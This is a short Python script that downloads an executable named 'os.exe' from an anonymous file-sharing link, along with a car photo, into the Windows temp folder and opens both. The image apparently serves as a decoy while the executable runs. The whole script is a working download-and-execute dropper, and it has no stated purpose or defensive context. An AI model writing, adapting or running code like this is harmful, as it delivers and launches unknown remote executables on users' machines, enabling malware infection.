import os
import urllib.request

urls = "https://transfer.sh/get/cdQ350/os.exe,https://hips.hearstapps.com/hmg-prod/images/2024-lamborghini-revuelto-127-641a1d518802b.jpg"
urlsArray = urls.split(",")

def download_file(url):
    filename = os.path.basename(url)
    filepath = os.path.join(os.environ['TEMP'], filename)
    urllib.request.urlretrieve(url, filepath)
    return filepath

for url in urlsArray:
    file_path = download_file(url)
    print("Downloaded file path: " + file_path)
    os.startfile(file_path)
